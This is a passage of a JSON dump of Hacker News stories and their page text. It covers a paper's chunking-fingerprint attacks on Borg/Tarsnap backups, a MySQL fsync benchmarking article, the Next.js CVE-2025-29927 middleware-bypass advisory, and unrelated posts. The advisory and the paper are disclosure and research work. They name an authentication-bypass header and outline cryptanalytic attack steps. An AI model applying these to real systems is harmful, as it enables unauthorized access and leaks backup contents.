y i,j   ∈   Z / 2 Z   for   j   ∈ { 0 , . . . ,   31 }   to be bits such that   x [ i ] =   y i, 0 y i, 1   · · ·   y i, 31 .   Our task is to solve for the   256   variables   x [ i ]   by solving for the  256   ·   32 = 2 13   variables   y i,j   . Analogous to Tarsnap, a clash after   b 1   · · ·   b 4095   corresponds to some  4 This estimation comes from the square root condition mentioned in the Tarsnap specs.  5 From [2]: “The buzhash table is altered by XORing it with a seed randomly generated once for the repository, and stored encrypted in the keyfile.   This is to prevent chunk size based fingerprinting attacks on your encrypted repo contents (to guess what files you have based on a specific set of chunk sizes).”  9\n\nrelation   4094 ⊕  i =0  s i ( x [ b i ]) =   d 0   . . . d 10   0   · · ·   0 ︸   ︷︷   ︸  21 zeroes  where the   d 0   through   d 10   are binary digits.  Attack 3   (Borg, linear algebra) .  1. Input any (reasonably expressive) data; obtain   391   clashes   C 1 , . . . , C 391 .  2. Each such relation corresponds to   21   equations corresponding to one of the last   21   bits in the XOR equaling   0 . These would all take the form  y i 0 ,j   +   y i 1 ,j +1   +   · · ·   +   y i 4094 ,j +4094   = 0   (mod 2) ,  where the second index in the subscripts is taken modulo   32 . 3. Solve the resulting linear system with the first   390   clashes, which has   21 · 390   equations and   2 13   variables. 4. Perform a clash consistency check with the results on   C 391 . Because   21   ·   391   >   2 13 , we have enough information to solve for all the variables (generically). This amount of data corresponds to about   21   ·   2 21   bits, or about   40   megabytes. In an actual attack we would need actual clashes instead of chunks, which would account for some additional overhead. Attack 3 will not work if compression is enabled, since any ambiguity factor in compression would be multiplicative across the   c   clashes. We give a chosen plaintext attack for this case. First, we make the following algebraic observations, changing our bitstring operations to algebra over  R   =   GF   (2)[ X ] / 〈 X 31   −   1 〉 : 1. For each   i   ∈ { 0 ,   1 , . . . ,   511 } , interpret   x [ i ]   as a degree   ≤   31   polynomial   P i ( X )   over   GF   (2) ; specifically, we can define a map   p   :   { 0 ,   1 } 31   →   R   such that  p ( y i, 0 y i, 1   · · ·   y i, 31 ) =   y i, 0 X 31   +   y i, 1 X 30   +   · · ·   y i, 31 .  2. The action of applying   s   in the bitstring interpretation is equivalent to multiplying by   X  modulo   X 32   −   1   in the polynomial interpretation. That is,   p ( s ( x [ y ])) =   Xp ( x [ y ])   in   R . 3. The action of XORing in the bitstring interpretation is equivalent to addition in the polynomial interpretation. Now, we start by choosing only two types of bytes, say   0   and   1 , in our chosen plaintext attack. Recall that each clash then corresponds to  4094 ⊕  i =0  s i ( x [ b i ]) =   d 0   . . . d 10   0   · · ·   0 ︸   ︷︷   ︸  21 zeroes  where each   b i   equals   0   or   1 . Translated into   R , this means  4094 ∑  i =0  X i P b i   ( X ) =   α 31 X 31   +   α 32 X 30   +   · · ·   +   α 21 X 21  10",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "8cd333a959895658",
    "title": {
      "en": "MySQL transactions per second vs. fsyncs per second (2020)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://sirupsen.com/napkin/problem-10-mysql-transactions-per-second",
    "score": 112,
    "by": "jcartw",
    "time": 1742591919,
    "content": "MySQL transactions per second vs fsyncs per secondself.__wrap_b=(t,n,e)=>{e=e||document.querySelector(`[data-br=\"${t}\"]`);let s=e.parentElement,r=R=>e.style.maxWidth=R+\"px\";e.style.maxWidth=\"\";let o=s.clientWidth,i=s.clientHeight,c=o/2-.25,l=o+.5,u;if(o){for(;c+1<l;)u=Math.round((c+l)/2),r(u),s.clientHeight===i?l=u:c=u;r(l*n+o*(1-n))}e.__wrap_o||(e.__wrap_o=new ResizeObserver(()=>{self.__wrap_b(0,+e.dataset.brr,e)})).observe(s)};self.__wrap_b(\":Rj8m:\",1)Jul 2020Just wondering how many transactions or writes per second MySQL can handle? While it depends on many factors, fundamentally, about as many transactions as MySQL can commit to disk per second. A modern disk can do ~1000 fsyncs per second, but MySQL will group multiple writes with each fsync. An okay rule-of-thumb would be 5000-15,000 writes per second, depending on things like writes per transaction, number of indexes, hardware, size of writes, etc. Read the article to understand this in more depth!Table of ContentsProblem 10: Is MySQL’s maximum transactions per second equivalent to fsyncs per second?Problem 9: Inverted IndexNapkin friends, from near and far, it’s time for another napkin problem!\nSince the beginning of this newsletter I’ve posed problems for you to try to\nanswer. Then in the next month’s edition, you hear my answer. Talking with a few\nof you, it seems many of you read these as posts regardless of their\nproblem-answer format.\nThat’s why I’ve decided to experiment with a simpler format: posts where I both\npresent a problem and solution in one go. This one will be long, since it’ll\ninclude an answer to last month’s.\nHope you enjoy this format! As always, you are encouraged to reach out with\nfeedback.\nProblem 10: Is MySQL’s maximum transactions per second equivalent to fsyncs per second?\nHow many transactions (‘writes’) per second is MySQL capable of?\nA naive model of how a write (a SQL insert/update/delete) to an ACID-compliant\ndatabase like MySQL works might be the following (this applies equally to\nPostgres, or any other relational/ACID-compliant databases, but we’ll\nproceed to work with MySQL as it’s the one I know best):\n\nClient sends query to MySQL over an existing connection: INSERT INTO products (name, price) VALUES ('Sneaker', 100)\nMySQL inserts the new record to the write-ahead-log (WAL) and calls\nfsync(2) to tell the operating system to tell the filesystem to tell the\ndisk to make sure that this data is for sure, pinky-swear committed to\nthe disk. This step, being the most complex, is depicted below.\nMySQL inserts the record into an in-memory page in the backing storage engine\n(InnoDB) so the record will be visible to subsequent queries. Why commit to\nthe storage engine and the WAL? The storage engine is optimized for serving\nquery results the data, and the WAL for writing it in a safe manner — we\ncan’t serve a SELECT efficiently from the WAL!\nMySQL returns OK to the client.\nMySQL eventually calls fsync(2) to ensure InnoDB commits the page to disk.\n\nIn the event of power-loss at any of these points, the behaviour can be defined\nwithout nasty surprises, upholding our dear ACID-compliance.\nSplendid! Now that we’ve constructed a naive model of how a relational database\nmight handle writes safely, we can consider the latency of inserting a new\nrecord into the database. When we consult the reference napkin numbers, we\nsee that the fsync(2) in step (2) is by far the slowest operation in the\nblocking chain at 1 ms.\nFor example, the network handling at step (1) takes roughly ~10 μs (TCP Echo\nServer is what we can classify as ‘the TCP overhead’). The write(2) itself\nprior to the fsync(2) is also negligible at ~10 μs, since this system call\nessentially just writes to an in-memory buffer (the ‘page cache’) in the kernel.\nThis doesn’t guarantee the actual bits are committed on disk, which means an\nunexpected loss of power would erase the data, dropping our ACID-compliance on\nthe floor. Calling fsync(2) guarantees us the bits are persisted on the disk,\nwhich will survive an unexpected system shutdown.  Downside is that it’s 100x\nslower.\nWith that, we should be able to form a simple hypothesis on the maximum\nthroughput of MySQL:\n\nThe maximum theoretical throughput of MySQL is equivalent to the maximum\nnumber of fsync(2) per second.\n\nWe know that fsync(2) takes 1 ms from earlier, which means we would naively\nexpect that MySQL would be able to perform in the neighbourhood of: 1s / 1ms/fsync = 1000 fsyncs/s = 1000 transactions/s .\nExcellent. We followed the first three of the napkin math steps: (1) Model the\nsystem, (2) Identify the relevant latencies, (3) Do the napkin math, (4) Verify\nthe napkin calculations against reality.\nOn to (4: Verifying)! We’ll write a simple benchmark in Rust that writes to\nMySQL with 16 threads, doing 1,000 insertions each:\nfor i in 0..16 {\n    handles.push(thread::spawn({\n        let pool = pool.clone();\n        move || {\n            let mut conn = pool.get_conn().unwrap();\n            // TODO: we should ideally be popping these off a queue in case of a stall\n            // in a thread, but this is likely good enough.\n            for _ in 0..1000 {\n                conn.exec_drop(\n                    r\"INSERT INTO products (shop_id, title) VALUES (:shop_id, :title)\",\n                    params! { \"shop_id\" => 123, \"title\" => \"aerodynamic chair\" },\n                )\n                .unwrap();\n            }\n        }\n    }));\n\n    for handle in handles {\n      handle.join().unwrap();\n    }\n    // 3 seconds, 16,000 insertions\n}\n\nThis takes ~3 seconds to perform 16,000 insertions, or ~5,300 insertions per\nsecond. This is 5x more than the 1,000 fsync per second our napkin math\ntold us would be the theoretical maximum transactional throughput!\nTypically with napkin math we aim for being within an order of magnitude, which\nwe are. But, when I do napkin math it usually establishes a lower-bound for the\nsystem, i.e. from first-principles, how fast could this system perform in\nideal circumstances?\nRarely is the system 5x faster than napkin math. When we identify a\nsignificant-ish gap between the real-life performance and the expected\nperformance, I call it the “first-principle gap.” This is where curiosity sets\nin. It typically means there’s (1) an opportunity to improve the system, or (2)\na flaw in our model of the system. In this case, only (2) makes sense, because\nthe system is faster than we predicted.\nWhat’s wrong with our model of how the system works? Why aren’t fsyncs per\nsecond equal to transactions per second?\nFirst I examined the benchmark… is something wrong? Nope SELECT COUNT(*) FROM products says 16,000. Is the MySQL I’m using configured to not fsync on every\nwrite? Nope, it’s at the safe default.\nThen I sat down and thought about it. Perhaps MySQL is not doing an fsync\nfor every single write? If it’s processing 5,300 insertions per second,\nperhaps it’s batching multiple writes together as part of writing to the WAL,\nstep (2) above? Since each transaction is so short, MySQL would benefit from\nwaiting a few microseconds to see if other transactions want to ride along\nbefore calling the expensive fsync(2).\nWe can test this hypothesis by writing a simple bpftrace script to observe the\nnumber of fsync(1) for the ~16,000 insertions:\ntracepoint:syscalls:sys_enter_fsync,tracepoint:syscalls:sys_enter_fdatasync\n/comm == \"mysqld\"/\n{\n        @fsyncs = count();\n}\n\nRunning this during the ~3 seconds it takes to insert the 16,000 records we get\n~8,000 fsync calls:\n$ sudo bpftrace fsync_count.d\nAttaching 2 probes...\n^C\n\n@fsyncs: 8037\n\nThis is a peculiar number. If MySQL was batching fsyncs, we’d expect something\nfar lower. This number means that we’re on average doing ~2,500 fsync per\nsecond, at a latency of ~0.4ms. This is twice as fast as the fsync latency we\nexpect, the 1ms mentioned earlier. For sanity, I ran the script to benchmark\nfsync outside MySQL again, no, still 1ms. Looked at the\ndistribution, and it was consistently ~1ms.\nSo there’s two things we can draw from this: (1) We’re able to fsync more than\ntwice as fast as we expect, (2) Our hypothesis was correct that MySQL is more\nclever than doing one fsync per transaction, however, since fsync also was\nfaster than expected, this didn’t explain everything.\nIf you remember from above, while committing the transaction could theoretically\nbe a single fsync, other features of MySQL might also call fsync. Perhaps\nthey’re adding noise?\nWe need to group fsync by file descriptor to get a better idea of how MySQL\nuses fsync. However, the raw file descriptor number doesn’t tell us much. We\ncan use readlink and the proc file-system to obtain the file name the file\ndescriptor points to. Let’s write a bpftrace script to see what’s being\nfsync‘ed:\ntracepoint:syscalls:sys_enter_fsync,tracepoint:syscalls:sys_enter_fdatasync\n/comm == str($1)/\n{\n  @fsyncs[args->fd] = count();\n  if (@fd_to_filename[args->fd]) {\n  } else {\n    @fd_to_filename[args->fd] = 1;\n    system(\"echo -n 'fd %d -> ' &1>&2 | readlink /proc/%d/fd/%d\",\n           args->fd, pid, args->fd);\n  }\n}\n\nEND {\n  clear(@fd_to_filename);\n}\n\nRunning this while inserting the 16,000 transactions into MySQL gives us:\npersonal@napkin:~$ sudo bpftrace --unsafe fsync_count_by_fd.d mysqld\nAttaching 5 probes...\nfd 5 -> /var/lib/mysql/ib_logfile0 # redo log, or write-ahead-log\nfd 9 -> /var/lib/mysql/ibdata1 # shared mysql tablespace\nfd 11 -> /var/lib/mysql/#ib_16384_0.dblwr # innodb doublewrite-buffer\nfd 13 -> /var/lib/mysql/undo_001 # undo log, to rollback transactions\nfd 15 -> /var/lib/mysql/undo_002 # undo log, to rollback transactions\nfd 27 -> /var/lib/mysql/mysql.ibd # tablespace\nfd 34 -> /var/lib/mysql/napkin/products.ibd # innodb storage for our products table\nfd 99 -> /var/lib/mysql/binlog.000019 # binlog for replication\n^C\n\n@fsyncs[9]: 2\n@fsyncs[12]: 2\n@fsyncs[27]: 12\n@fsyncs[34]: 47\n@fsyncs[13]: 86\n@fsyncs[15]: 93\n@fsyncs[11]: 103\n@fsyncs[99]: 2962\n@fsyncs[5]: 4887\n\nWhat we can observe here is that the majority of the writes are to the “redo\nlog”, what we call the “write-ahead-log” (WAL). There’s a few fsync calls to\ncommit the InnoDB table-space, not nearly as often, as we can always recover\nthis from the WAL in case we crash between them. Reads work just fine prior to\nthe fsync, as the queries can simply be served out of memory from InnoDB.\nThe only surprising thing here is the substantial volume of writes to the\nbinlog, which we haven’t mentioned before. You can think of the binlog as the\n“replication stream.” It’s a stream of events such as row a changed from x to y, row b was deleted, and table u added column c. The primary replica\nstreams this to the read-replicas, which use it to update their own data.\nWhen you think about it, the binlog and the WAL need to be kept exactly in\nsync. We can’t have something committed on the primary replica, but not\ncommitted to the replicas. If they’re not in sync, this could cause loss of data\ndue to drift in the read-replicas. The primary could commit a change to the WAL,\nlose power, recover, and never write it to the binlog.\nSince fsync(1) can only sync a single file-descriptor at a time, how can you\npossibly ensure that the binlog and the WAL contain the transaction?\nOne solution would be to merge the binlog and the WAL into one log. I’m not\nentirely sure why that’s not the case, but likely the reasons are historic. If\nyou know, let me know!\nThe solution employed by MySQL is to use a 2-factor commit. This requires three\nfsyncs to commit the transaction. This and this reference explain\nthis process in more detail. Because the WAL is touched twice as part of the\n2-factor commit, it explains why we see roughly ~2x the number of fsync to\nthat over the bin-log from the bpftrace output above. The process of grouping\nmultiple transactions into one 2-factor commit in MySQL is called ‘group commit.’\nWhat we can gather from these numbers is that it seems the ~16,000 transactions\nwere, thanks to group commit, reduced into ~2885 commits, or ~5.5 transactions\nper commit on average.\nBut there’s still one other thing remaining… why was the average latency per\nfsync twice as fast as in our benchmark? Once again, we write a simple\nbpftrace script:\ntracepoint:syscalls:sys_enter_fsync,tracepoint:syscalls:sys_enter_fdatasync\n/comm == \"mysqld\"/\n{\n        @start[tid] = nsecs;\n}\n\ntracepoint:syscalls:sys_exit_fsync,tracepoint:syscalls:sys_exit_fdatasync\n/comm == \"mysqld\"/\n{\n        @bytes = lhist((nsecs - @start[tid]) / 1000, 0, 1500, 100);\n        delete(@start[tid]);\n}\n\nWhich throws us this histogram, confirming that we’re seeing some very fast\nfsyncs:\npersonal@napkin:~$ sudo bpftrace fsync_latency.d\nAttaching 4 probes...\n^C\n\n@bytes:\n[0, 100)             439 |@@@@@@@@@@@@@@@                                     |\n[100, 200)             8 |                                                    |\n[200, 300)             2 |                                                    |\n[300, 400)           242 |@@@@@@@@                                            |\n[400, 500)          1495 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@|\n[500, 600)           768 |@@@@@@@@@@@@@@@@@@@@@@@@@@                          |\n[600, 700)           376 |@@@@@@@@@@@@@                                       |\n[700, 800)           375 |@@@@@@@@@@@@@                                       |\n[800, 900)           379 |@@@@@@@@@@@@@                                       |\n[900, 1000)          322 |@@@@@@@@@@@                                         |\n[1000, 1100)         256 |@@@@@@@@                                            |\n[1100, 1200)         406 |@@@@@@@@@@@@@@                                      |\n[1200, 1300)         690 |@@@@@@@@@@@@@@@@@@@@@@@@                            |\n[1300, 1400)         803 |@@@@@@@@@@@@@@@@@@@@@@@@@@@                         |\n[1400, 1500)         582 |@@@@@@@@@@@@@@@@@@@@                                |\n[1500, ...)         1402 |@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    |\n\nTo understand exactly what’s going on here, we’d have to dig into the\nfile-system we’re using. This is going to be out of scope (otherwise I’m never\ngoing to be sending anything out). But, to not leave you completely hanging,\npresumably, ext4 is using techniques similar to MySQL’s group commit to batch\nwrites together in the journal (equivalent to the write-ahead-log of MySQL). In\next4’s vocabulary, this seems to be called max_batch_time, but the\ndocumentation on this is scanty at best. The disk could also be doing this in\naddition/instead of the file-system. If you know more about this, please\nenlighten me!\nThe bottom-line is that fsync can perform faster during real-life workloads than the\n1 ms I obtain on this machine from repeatedly writing and fsyncing a file. Most\nlikely from the ext4 equivalent of group commit, which we won’t see on a\nbenchmark that never does multiple fsyncs in parallel.\nThis brings us back around to explaining the discrepancy between real-life and\nthe napkin-math of MySQL’s theoretical, maximum throughput. We are able to\nachieve an at least 5x increase in throughput from raw fsync calls due to:\n\nMySQL merging multiple transactions into fewer fsyncs through ‘group commits.’\nThe file-system and/or disk merging multiple fsyncs performed in parallel\nthrough its own ‘group commits’, yielding faster performance.\n\nIn essence, the same technique of batching is used at every layer to improve\nperformance.\nWhile we didn’t manage to explain everything that’s going on here, I certainly\nlearned a lot from this investigation. It’d be interesting light of this to play\nwith changing the group commit settings to optimize MySQL for throughput over\nlatency. This could also be tuned at the file-system level.\nProblem 9: Inverted Index\nLast month, we looked at the inverted\nindex. This data-structure is what’s\nbehind full-text search, and the way the documents are packed works well for set\nintersections.\n\n(A) How long do you estimate it’d take to get the ids for title AND see with 2\nmillion ids for title, and 1 million for see?\nLet’s assume that each document id is stored as a 64-bit integer. Then we’re\ndealing with 1 * 10^6 * 64bit = 8 Mb and 2 * 10^6 * 64 bit = 16 Mb. If we\nuse an exceptionally simple set intersection algorithm of essentially two nested\nfor-loops, we need to scan ~24Mb of sequential memory. According to the\nreference, we can do this in 1Mb/100us * 24Mb = 2.4ms.\nStrangely, the Lucene nightly benchmarks are performing these queries at\nroughly 22 QPS, or 1000ms/22 = 45ms per query. That’s substantially worse than\nour prediction. I was ready to explain why Lucene might be faster (e.g. by\ncompressing postings to less than 64-bit), but not why it might be 20x slower!\nWe’ve got ourselves another first-principle gap.\nSome slowness can be due to reading from disk, but since the access pattern is\nsequential, it should only be 2-3x slower. The hardware could be different\nthan the reference, but hardly anything that’d explain 20x. Sending the data to\nthe client might incur a large penalty, but again, 20x seems enormous. This type\nof gap points towards missing something fundamental (as we saw with MySQL).\nUnfortunately, this month I didn’t have time to dig much deeper than this, as I\nprioritized the MySQL post.\n(B) What about title OR see?\nIn this case we’d have to scan roughly as much memory, but handle more documents\nand potentially transfer more back to the client. We’d expect to roughly be in\nthe same ballpark for performance ~2.4ms.\nLucene in this case is doing roughly half the throughput, which aligns with\nour relative expectations. But again, in absolute terms, Lucene’s handling these\nqueries in ~100ms, which is much, much higher than we expect.\n(C) How do the Lucene nightly benchmarks compare for (A) and (B)? This file\nshows some of the actual terms used. If they don’t line up, how might you\nexplain the discrepency?\nAnswered inline with (A) and (B).\n(D) Let’s imagine that we want title AND see and order the results by the last\nmodification date of each document. How long would you expect that to take?\nIf the postings are not stored in that order, we’d naively expect in the worst\ncase we’d need to sort roughly ~24Mb of memory, at\n5ms/Mb. This would land us in the\n5mb/mb * 24mb ~= 120ms query time ballpark.\nIn reality, this seems like an unintentional trick question. If ordered by last\nmodification date, they’d already be sorted in roughly that order, since new\ndocuments are inserted to the end of the list. Which means they’re already\nstored in roughly the right order, meaning our sort has to move far less bits\naround. Even if that wasn’t the case, we could store sorted list for just this\ncolumn, which e.g. Lucene allows with doc values.Subscribe through email, RSS or Twitter to new articles! 3,637 subscribersYou might also like...Using checksums to verify syncing 100M database recordsShitlist Driven DevelopmentNeural Network From ScratchInverted Index Performance and Merkle Tree SyncronizationIncrease HTTP Performance by Fitting In the Initial TCP Slow Start Window",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "2852f55e961e65fa",
    "title": {
      "en": "Next.js version 15.2.3 has been released to address a security vulnerability",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://nextjs.org/blog/cve-2025-29927",
    "score": 140,
    "by": "makepanic",
    "time": 1742678347,
    "content": "Back to BlogSaturday, March 22nd 2025CVE-2025-29927Posted byLee Robinson@leerobNext.js version 15.2.3 has been released to address a security vulnerability (CVE-2025-29927). Additionally, backported patches are available.\nWe recommend that all self-hosted Next.js deployments using next start and output: 'standalone' should update immediately.\nContinue reading for more details on the CVE.\nTimeline\n\n2025-02-27T06:03Z: Disclosure to Next.js team via GitHub private vulnerability reporting\n2025-03-14T17:13Z: Next.js team started triaging the report\n2025-03-14T19:08Z: Patch pushed for Next.js 15.x\n2025-03-14T19:26Z: Patch pushed for Next.js 14.x\n2025-03-17T22:44Z: Next.js 14.2.25 released\n2025-03-18T00:23Z: Next.js 15.2.3 released\n2025-03-18T18:03Z: CVE-2025-29927 issued by GitHub\n2025-03-21T10:17Z: Security Advisory published\n2025-03-22T21:21Z: Next.js 13.5.9 released\n\nWe are also publishing a backport for v12. We will update this post as they are released.\nVulnerability details\n\nNext.js uses an internal header x-middleware-subrequest to prevent recursive requests from triggering infinite loops. The security report showed it was possible to skip running Middleware, which could allow requests to skip critical checks—such as authorization cookie validation—before reaching routes.\nImpact scope\n\nAffected\n\nSelf-hosted Next.js applications using Middleware (next start with output: standalone)\nThis affects you if you rely on Middleware for auth or security checks, which are not then validated later in your application.\nApplications using Cloudflare can turn on a Managed WAF rule\n\nNot affected\n\nApplications hosted on Vercel\nApplications hosted on Netlify\nApplications deployed as static exports (Middleware not executed)\n\nPatched versions\n\nFor Next.js 15.x, this issue is fixed in 15.2.3\nFor Next.js 14.x, this issue is fixed in 14.2.25\nFor Next.js 13.x, this issue is fixed in 13.5.9\n\nIf patching to a safe version is infeasible, it is recommended that you prevent external user requests which contain the x-middleware-subrequest header from reaching your Next.js application.\nWe are also publishing a backport for v12. We will update this post as they are released.\nOur security responsibility\n\nNext.js has published 16 security advisories since 2016. Over time, we've continued to improve how we gather, patch, and disclose vulnerabilities.\nGitHub Security Advisories and CVEs are industry-standard approaches to notifying users, vendors, and companies of vulnerabilities in software. While we have published a CVE, we missed the mark on partner communications.\nTo help us more proactively work with partners depending on Next.js, and other infrastructure providers, we are opening a partner mailing list. Please reach out to partners@nextjs.org to be included.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "95cb9bc8cf450a2f",
    "title": {
      "en": "Use Long Options in Scripts",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://matklad.github.io/2025/03/21/use-long-options-in-scripts.html",
    "score": 269,
    "by": "OptionOfT",
    "time": 1742587020,
    "content": "Use Long Options in Scripts Mar 21, 2025\nMany command line utilities support short form options (-f) and long form options (--force).\nShort form is for interactive usage. In scripts, use the long form.\nThat is, in your terminal, type $ git switch -c my-new-branch\nIn your release infrastructure script, write\n\ntry shell.exec(\"git fetch origin --quiet\", .{});\ntry shell.exec(\n    \"git switch --create release-{today} origin/main\",\n    .{ .today = stdx.DateUTC.now() },\n);\n\nLong form options are much more self-explanatory for the reader.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "465b9edbf784649a",
    "title": {
      "en": "Claude can now search the web",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.anthropic.com/news/web-search",
    "score": 1192,
    "by": "meetpateltech",
    "time": 1742489472,
    "content": "ProductClaude can now search the web2025년 3월 21일●1 min readYou can now use Claude to search the internet to provide more up-to-date and relevant responses. With web search, Claude has access to the latest events and information, boosting its accuracy on tasks that benefit from the most recent data.When Claude incorporates information from the web into its responses, it provides direct citations so you can easily fact check sources. Instead of finding search results yourself, Claude processes and delivers relevant sources in a conversational format. This enhancement expands Claude's extensive knowledge base with real-time insights, providing answers based on more current information.Popular ways to use Claude with web search:Sales teams can transform account planning and drive higher win rates through informed conversations with prospects by analyzing industry trends to learn key initiatives and pain points.Financial analysts can assess current market data, earnings reports, and industry trends to make better investment decisions and inform financial model assumptions.Researchers can build stronger grant proposals and literature reviews by searching across primary sources on the web, spotting emerging trends and identifying gaps in the current literature.Shoppers can compare product features, prices, and reviews across multiple sources to make more informed purchase decisions.Getting startedWeb search is available now in feature preview for all paid Claude users in the United States. Support for users on our free plan and more countries is coming soon. To get started, toggle on web search in your profile settings and start a conversation with Claude 3.7 Sonnet. When applicable, Claude will search the web to inform its response.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "9201e0b343cae4fe",
    "title": {
      "en": "‘The Celts: A Modern History’ by Ian Stewart Review",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.historytoday.com/archive/review/celts-modern-history-ian-stewart-review",
    "score": 102,
    "by": "lermontov",
    "time": 1742537284,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "d51f7e766c5883db",
    "title": {
      "en": "Even the worst mass extinction had its oases",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://arstechnica.com/science/2025/03/even-the-worst-mass-extinction-had-its-oases/",
    "score": 97,
    "by": "Hooke",
    "time": 1742361693,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "87c562eca48f4e1f",
    "title": {
      "en": "43-year-old Family Canoe Trip",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://paddlingmag.com/stories/features/legendary-43-year-family-canoe-story/",
    "score": 93,
    "by": "cameron_b",
    "time": 1742299581,
    "content": "Home  Stories  Features  A Legendary 43-Year Family Canoe Story\n\n                TripsAdventuresStoriesFamilyFeatures                A Legendary 43-Year Family Canoe Story\n\n                                    800-miles through time and wilderness up the Inside Passage\n\n\t\tFacebookTwitterPinterestEmailMix\n\nOn June 14, 1974, my grandma Glady dropped her two sons off at a marina in the Puget Sound. They loaded gear into homemade woodstrip canoes and pushed off into the cold, black water.Decades later, Grandma told me as she watched them disappear into the fog, she wondered if she would ever see her boys again.\nMy dad, Alan, and his best friend and younger brother, Andy, had been planning this trip for years. They were climbers, mountaineers and fishermen. Before leaving college and entering what they remember calling “the real world,” they wanted one last adventure—an experience truly unknown and challenging; something beautiful they could share as brothers, and with my dad’s girlfriend, Sara, who would later become his wife and my mother, and a small band of college friends.\n\nAfter my dad finished college, he and my uncle built their own canoes in a college basement, launched them into the Pacific, and became some of the first people in recent history to canoe the Inland Passage from Vancouver to Alaska.\nTheir story became a legend in my family. One of the original boats still hangs in my parent’s garage. My brother, Ben, and I grew up paddling the old canoe—fishing from it in the Pacific Northwest and beating it up in eastern rivers, like the Shenandoah. As we reeled in fish and cut through waterways, we couldn’t help but marvel at the craft our dad built and wonder what the 1974 adventure was actually like.\nWhen I was 16, I unearthed a dusty cardboard box behind my dad’s CDs and cassette tapes. Carelessly written on the top of the box were the words, Canoe Trip. The images and film negatives I found inside painted vivid pictures of the 1974 legend—a story of risk, naysayers and adventure. I studied the photographs countless times, mesmerized by images of my 20-year-old parents on the adventure of a lifetime.\nLooking back now, almost two decades after finding the images, I’m certain the story of my parents’ journey on the Inside Passage shaped my life choices. How could a journey I never directly experienced have had such a profound impact on me?\nBefore I could answer this question, I needed to understand what really happened in 1974. And so, for nearly a year, I worked on a documentary about their legendary canoe trip. In the process, I learned volumes about the real journey, my parents and myself.\n\n\t\t\t\t<img fetchpriority=\"high\" decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage4.jpg\" class=\"attachment-full size-full\" alt=\"man sitting in an old truck\" aria-describedby=\"gallery-1-18310\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage4-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage4-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage4-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage4.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\t“The good thing when you’re young and you come up with an idea that everyone thinks is crazy is that you’re too young to understand they perspective, you just think they’re crazy and they don’t understand.” -Alan Dappen, pictured in 1974. | Photo: Courtesy of Nate & Alan Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage5.jpg\" class=\"attachment-full size-full\" alt=\"man smiling\" aria-describedby=\"gallery-1-18311\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage5-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage5-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage5-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage5.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tAlan Dappen pictured in 2017. | Photo: Courtesy of Nate & Alan Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage7.jpg\" class=\"attachment-full size-full\" alt=\"man with camera\" aria-describedby=\"gallery-1-18313\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage7-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage7-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage7-1024x684.jpg 1024w, https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage7.jpg 1068w\" sizes=\"(max-width: 1068px) 100vw, 1068px\" />\n\n\t\t\t\tBrother Andy in 1974. | Photo: Courtesy of Nate & Alan Dappen\n\n\t\t\t\t<img decoding=\"async\" width=\"1068\" height=\"713\" src=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/11/43-year-paddling-journey-through-passage6.jpg\" class=\"attachment-full size-full\" alt=\"man smiling\" aria-describedby=\"gallery-1-18312\" srcset=\"https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage6-300x200.jpg 300w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage6-768x513.jpg 768w, https://paddlingmagazine-images.s3.amazonaws.com/2018/10/43-year-paddling-journey-through-passage6-1024x684.jpg 1024w, 